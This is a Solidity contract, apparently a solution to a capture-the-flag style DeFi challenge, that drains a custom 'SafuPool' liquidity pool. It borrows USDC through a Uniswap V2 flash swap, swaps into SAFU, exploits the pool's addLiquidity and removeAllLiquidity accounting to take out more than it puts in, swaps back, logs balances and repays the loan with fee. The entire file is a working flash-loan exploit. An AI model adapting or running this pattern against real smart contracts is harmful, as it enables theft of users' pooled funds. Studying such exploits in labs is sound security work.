// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SafuUtils} from "./SafuUtils.sol";
import {SafuPool} from "./SafuPool.sol";
import {console} from "forge-std/console.sol";

interface IUniPair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract SafuSwapperExploiter {

    SafuPool public pool;
    IUniPair public uniPair;
    IERC20 public usdc;
    IERC20 public safu;

    constructor (address _pool, address _uniPair, address _usdc, address _safu) {
        pool = SafuPool(_pool);
        uniPair = IUniPair(_uniPair);
        usdc = IERC20(_usdc);
        safu = IERC20(_safu);
    }

    function startExploit() public {
        uniPair.swap(900_000e18,0,address(this),bytes('not empty'));
    }

    function uniswapV2Call(address, uint _amount0, uint, bytes calldata) external {
        // flash laon
        // swap USDC to SAFU
        // add Liquidity with few money, get SAFU-USDC LP (more than added SAFU)
        // removeLiquidity
        usdc.approve(address(pool), type(uint).max);
        pool.swap(address(safu), 999_999e18);
        pool.addLiquidity(0, 1e18);
        pool.removeAllLiquidity();
        safu.approve(address(pool), type(uint).max);
        pool.swap(address(usdc), safu.balanceOf(address(this)));
        pool.addLiquidity(0, 1e18);
        pool.removeAllLiquidity();
        console.log("balance of usdc", usdc.balanceOf(address(this)));
        console.log("balance of safu", safu.balanceOf(address(this)));
        console.log("balance of pool", pool.balanceOf(address(this)));
        console.log("pool balance of usdc", usdc.balanceOf(address(pool)));
        console.log("pool balance of safu", safu.balanceOf(address(pool)));
        uint256 loanPlusInterest = (_amount0*(10**18)*1000/997/(10**18))+1; // exact amount owed
        console.log("loanPlusInterest", loanPlusInterest);
        usdc.transfer(msg.sender,loanPlusInterest);
    }

}